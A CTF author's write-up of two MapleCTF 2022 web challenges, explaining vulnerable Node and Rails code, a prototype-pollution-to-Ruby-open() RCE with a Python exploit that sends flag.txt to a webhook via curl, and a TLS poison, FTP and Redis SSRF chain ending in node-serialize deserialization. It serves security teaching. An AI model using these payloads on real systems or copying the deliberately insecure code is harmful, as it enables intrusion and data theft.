---
title: "MapleCTF 2022: Vie's challenges"
date: 2022-09-01T14:50:08-06:00
draft: false
comments: false
images: ["images/ArtGallery.png"]
categories:
  - writeups
tags:
  - writeups
  - tls-poison
  - ssrf
  - web
  - prototype-pollution
  - insecure-deserialization
  - ftp
toc: true
---

MapleCTF 2022 ran this year to great success, which is fantastic given the tight timeframe we were operating on shortly after coming back from DEFCON 30. We held a beginner-friendly, UBC-local version back in January, so our endgame for this version was to make more creative and harder challenges that people hopefully enjoyed. I wrote 3 web challenges for this CTF: honksay, Viene Library and Art Gallery, the latter 2 I will detail here. I hope you enjoyed them if you played! 

## Viene Library (11 solves)
Viene Library was a challenge I thought of using my "flag first" design template - where I think of the flag value and make a whole challenge around it. :>

I guess no one remembers vine anymore cause I don't think anyone remembered the references I put in? Especially the flag value, which was this [vine in particular (WARNING: profanity)](https://www.youtube.com/watch?v=nSYiyg8LGzY). 

Anyway, crisis and nostalgia aside, Viene Library was predicated on combining _my favourite bug_ prototype pollution and some cute and quirky things about how HTTP Rails servers operate. 

### Step 0: What's in the code?

The public facing server was a NodeJS one that would call back to a Ruby Rails server asking for txt files served from the filesystem - these txt files were my vine poems, or my "vienes". Both servers were in the same network in the same container. Only the NodeJS one was publicly accessible on port 8080.


_viene_controller.rb_
```rb
class VieneController < ApplicationController
    protect_from_forgery with: :null_session
    def index
        if request.local?
            if request.put?
                request_body = request.body.read
                if ['?', '{', '}', '~', '[', ']', ';'].include?(request_body)
                    render json: {"ERROR": "BAD HACKER"}
                end
                viene = open(request_body)
                render json: {"chosen_viene": viene}
                
            elsif request.post?
                if not ['1.txt', '2.txt', '3.txt'].include?(request.body.read)
                    render json: {"chosen_viene": "Error", "chosen_viene_link": "https://www.youtube.com/watch?v=dQw4w9WgXcQ"}
                else 
                    fullname = File.join("app","assets", "#{rand(1..3)}.txt")
                    viene = File.read(fullname)
                    #memes
                    viene_poem = viene.split('>')[1].strip
                    viene_url = viene.split('>')[0].strip
                    render json: {"chosen_viene": viene_poem, "chosen_viene_link": viene_url}
                end
            else
                render json: {"ERROR": "I didn't understand the request..."}
            end
        else 
            render json: {"ERROR": "Ur not local..."}
        end
    end
end
```

The Rails server had only one purpose: to serve you vienes. If it recieved a POST request it would give you the appropriate viene if the filename you gave it in the POST was valid, else it would just give you a randomized one. If you gave it a PUT, you could open whatever you want. 

I literally mean whatever you want. Ruby's native `open` call can open a [subprocess](https://apidock.com/ruby/Kernel/open) and pipe whatever you specify into that subprocess if the argument you pass to `open` starts with a single pipe (`|`) character. This is insta-RCE, but of course, only accessible to us if we make a valid PUT request. However...

```js

app.get("/", function (req, res) {
  //Recieve random viene from my "database"

  let rand = (Math.floor(Math.random()*3))+1;
  let filename = rand.toString() + ".txt";

  fetch(vieneSERVER, {method: 'POST', 
  body: filename,
  mode: 'no-cors'})
  .then((resp) => (resp.json()))
  .then((data) => {
    res.send(template(data.chosen_viene || "", data.chosen_viene_link || "https://www.youtube.com/watch?v=dQw4w9WgXcQ"));
  });
});

app.post("/findaviene", (req, res) => {
  if (req.body.viene)
  {
    fetch(vieneSERVER, {method: 'POST', 
      body: req.body.viene,
      mode: 'no-cors'})
    .then((resp) => (resp.json()))
    .then((data) => {
      res.send(template(data.chosen_viene, data.chosen_viene_link));
    });
  } else {
    res.send(template("", "https://www.youtube.com/watch?v=dQw4w9WgXcQ"));
  }
});
```

In the nodeJS server, there are only 2 potential avenues where it talks to the Rails server, and neither are PUT requests. What do we do? 

Putting a pin on it we can take a look further in nodeJS:

```js
function standardizeViene(template, viene) {
  for (let m in viene) {
    if (typeof (viene[m]) === "object", typeof (template[m]) === "object") {
      standardizeViene(template[m], viene[m]);
    } else {
      template[m] = viene[m];
    }
  }
  return template;
}

let vienesubs = [];
app.post("/submitaviene", function (req, res) {
  let newviene = req.body;
  //Standardize submission
  let viene_template = {
    sub_id: crypto.randomBytes(10).toString('hex')
  };
  //I'll look at it later
  vienesubs.push(standardizeViene(viene_template, newviene));
  res.send("Thanks! Your submission has been dropped into our pool succesfully. We'll let you know if we consider it!");
});
```

If you POST `/submitaviene` you could have your request body be standardized with `standardizeViene` which has a crystal clear proto pollution vulnerability. Keeping this in mind, we can take note of the fact that the server uses [node-fetch](https://www.npmjs.com/package/node-fetch) to make requests back to the Rails server, and so our attack plan is formulated: 

```
1. Proto-pollute node-fetch to PUT to Rails server
2. Ruby open() for RCE and get flog
```

### Step 1: Proto-pollution and node-fetch

[Recent research](https://portswigger.net/research/widespread-prototype-pollution-gadgets) showcases that the object you pass into the fetch API can be proto-polluted with all the methods and fields you could stipulate to a fetch request (including node-fetch). For us, the ideal candidate here is the `headers` field, since the `method` field was explicitly declared in either node-fetch request so we couldn't proto-pollute that.

The header I was thinking of was the `X-HTTP-Method-Override` header set to `PUT`, however I noticed some teams use `Content-Type` instead and set it to `application/x-www-form-urlencoded`, and adding `_method: PUT` in the form data to achieve the same effect.

Either way, proto-polluting headers with either will make [Rails interpret the request](https://www.rubydoc.info/gems/rack/Rack/MethodOverride) it recieves as a `PUT` instead of a `POST` regardless if whether or not the method field stated it was a `POST`. 

### Step 2: Ruby open()

Now that you're in the PUT logic of the viene controller in the Rails server, you get free RCE. 

```py
import requests

VIENE_URL_SUBMIT = 'http://vienelibrary.ctf.maplebacon.org/submitaviene'
VIENE_URL = "http://vienelibrary.ctf.maplebacon.org/findaviene"

put_data = {"__proto__": {"headers": {"X-HTTP-Method-Override": "PUT"}}}

payload = {"viene":"|curl https://webhook.site/f6a4aed1-64b2-4b8e-bb60-a970842d6c24 --data \"$(cat flag.txt)\""}

r = requests.post(VIENE_URL_SUBMIT, json=put_data)
print(r.text)
r = requests.post(VIENE_URL, json=payload)
print(r.text)
```
Someone please affirm me and say they remember vine.

## Art Gallery (3 solves)
Art Gallery was my most convoluted web challenge which is semi-inspired by Harmony Chat (DragonCTF 2020) and Contrived Web Problem (PlaidCTF 2020). Shoutout to our sponsor for the #sponsorship-debugging help. :> 

{{< image src="/images/ArtGallery.png" alt="My Art Gallery" position="center" style="border-radius: 8px;" >}}

Here is the TL;DR - 

```
1. Slightly modified TLS poison to SSRF the FTP server
2. Use FTP server to SSRF an "image file" containing Redis commands to the Redis server via RESP
3. "image file" overwrites a user's sessional key with a node-serialize payload which fires when user visits site
4. flag
```

### Step 0: WTF does this code do
The general idea of the app was as so:

- An image gallery that you could upload your own pictures to
- The images were served via FTP
- Session management was done via Redis, storing your art token and an array of filenames to retrieve from FTP, which were serialized for ease of storage

This challenge had alot of moving parts, so we will examine each individually to see how they all work together.


#### Insecure deserialization: node-serialize
Consult the following code: 

_app.js_
```js
app.use(async function (req, res, next) {
    if (req.session.art_token) {
        let val = await redisClient.get(`image_${req.session.art_token}`);
        //here
        let data_arr = serialize.unserialize(await redisClient.get(`image_${req.session.art_token}`));
        console.log(data_arr);
        req.images = []
        for (let key in data_arr) {
            req.images.push(data_arr[key]);
        }
    }
    res.on("finish", async function () {
        console.log(req.session);
        if (req.session){
            if (req.session.art_token) {
                await redisClient.set(`image_${req.session.art_token}`, serialize.serialize(req.images));
                let data = await redisClient.get(`image_${req.session.art_token}`);
            }
        }
    });
    next();
});
```
A user's array of images are serialized and pushed into Redis, but they're unserialized when needed using the dangerous [node-serialize](https://github.com/luin/serialize) library. If you manage to set `image_${req.session.art_token}` to an RCE node-serialize payload, it's game over. However, you couldn't do anything cheeky like submitting an image with the filename being the payload, you needed to manually change the value of that key in Redis. The Redis server, however, was not accessible to the public. 

#### Image file upload
The code handling the uploading of your own photos is below:

```js
app.post("/upload", (req, res) => {
    if (req.session.art_token) {
        //People can upload max 4 images, which are inserted into their images array rolling basis
        let random_filename = crypto.randomBytes(10).toString('hex') + ".png";

        //high quality design 
        req.files.file.mv(`/usr/src/app/ftp/files/${random_filename}`);

        req.images.push(random_filename);
        req.images.shift();
        res.redirect("/");
    } else {
        res.redirect("/");
    }
});
```
Now, take note that the filename given to your image appends a `.png` extension to it (`random_filename`) - this does nothing as the extension and file format are never checked as valid. Therefore, you could submit a file of any format and it will not get type-checked as a legit PNG image. 

### Step 1: TLS Poison
The first step is the most tedious/hardest to work on. For those unaware, TLS poison is an innovative way to use TLS session ids or tickets to create powerful new SSRF techniques - [here is the blackhat talk that discusses this in detail - thank you Joshua Maddux!](https://www.youtube.com/watch?v=udpamSmD_vU&ab_channel=BlackHat). 

The crux of the TLS poison is that the [exploit server that is freely available out of the box](https://github.com/jmdx/TLS-poison) needed to be tweaked if you were to use it for the challenge. The jmdx TLS server would expect 2 requests to the DNS server, and it would alternate A records on each request, which is fine for most use cases _except_ my challenge. See, the HTTP server makes a _curl_ request to the specified resource:


_Entrypoint into TLS poison part_
```js
app.get('/query', async (req, res) => {
    let host = req.query.host;
    const port = parseInt(req.query.port);
    try {
        //im aware its bad 
        cp.execFileSync("timeout", ['5s', 'curl', '-k', '-L', `https://${host}:${port}/`]);
    } catch (e) {
        console.log("Error encountered");
        console.log(e);
    }
    res.send("The curator will observe your art");
});
```

...and curl caches DNS records for 60 seconds, **including DNS records with 0 TTL**. This sorta screws us over, since instigating an HTTP redirect (in your domain) within that timeframe will visit the original server instead of asking our DNS server for the IP again. However, you couldn't wait the whole 60 seconds for the DNS cache to expire in libcurl, cause if the command would hang for a while, the server would complain. An additional 5s timeout was implemented as well which forcibly closes the curl connection way before a DNS server could redirect back to a localhost address. To move around this, you can instead have your DNS server send in multiple A records - one being the legit IP of your domain and the other being a local one - but immediately close the port of the first IP when the HTTP redirect occurs so curl has no choice but to try the other A record instead - the local one. 

This will succesfully force curl to ping a localhost IP and not retry a connection with your server IP. Of course, I saw, from the teams that solved Art Gallery, they got crafty around this part, so there are multiple ways to achieve TLS poison while avoiding libcurl's caching. 

In any case, you make the server submit a session ticket (NOT id as TLS 1.2 session ids are too small to fit the whole FTP payload in) to the FTP server, running on port 8021.

The session ticket would look something like:
```
[Random TLS stuff] \nUSER\nPASS\nPORT 127,0,0,1,24,235\nRETR <userfilename>
```

The `PORT` command makes the server operate on active mode, establishing a data channel with localhost on port 6379 (where the Redis server is), which allows you to send a file of your choosing in the server's filesystem through that data channel.

Anyway, bypass curl's caching and give the server a session ticket containing some FTP commands, leading to...

### Step 2: FTP SSRF
Remember the file format quirk?

What we could do with it was upload a file which contained RESP commands that set the user's key to a node-serialize RCE payload, and have the FTP server RETR that file to Redis on active mode. We couldn't talk to the Redis server on our own, so let's use the FTP server to talk to it instead.

Through TLS poisoning, you could submit a session ticket to the FTP server which would contain a bunch of FTP commands that should make the server operate on active mode, establish a data connection with the local Redis server on port 6379, and RETR the malicious "image" file to it. 

NOTE: The FTP server was intentionally made to be quiet even when recieving commands, as normal protocol involved it writing responses on input and it would try to do that into the SSL socket which caused problems. 

### Step 3: Redis SSRF
Redis also uses a plaintext protocol, RESP, for data manipulation. When the FTP server establishes a data connection to the Redis one, the file it sends over should contain new-line delimited RESP commands which set a user's "images" key to that of a node-serialize payload. 

Your uploaded 'image' file should have the following command inside:

```
SET image_<your art token> <node serialize payload>
```

### Step 4: Fleg

When you revisit the art gallery, the app should deserialize your payload, netting you the flag.

```
maple{M4N_I_L0V3_SSRFz_1N_My_SSRF5_In_my_556Fs}
```

### Notes

- The curl command was made possible with a pipe to a subprocess on `execFileSync`. A few people got hung up on this part as I believe this looks like a possible command injection - however, `execFileSync` passes the entire argument given to it as a single command, so injection was not possible. Others thought to use `gopher://` which is technically on the right track in terms of using SSRF, but again, not possible through the subprocess. 

- It was a bit of a struggle having the FTP -> Redis part work reliably, but for us, padding the "image" file with hella whitespaces was sufficient for that SSRF to work reliably. Some other teams also appended a QUIT command in their sessional tickets to achieve similar effect. 

- Of course, things would have been **considerably** easier had people managed to be able to connect to either the FTP server or the Redis server on their own. This was not possible as only the HTTP server's port was exposed. 

- Some of you may have been wondering - "Was the FTP server necessary? Was TLS Poison -> Redis not possible?" Maybe it was, but on initial tests the Redis server did NOT like random TLS junk that was included in the sessional tickets. FTP didn't care, so :/ 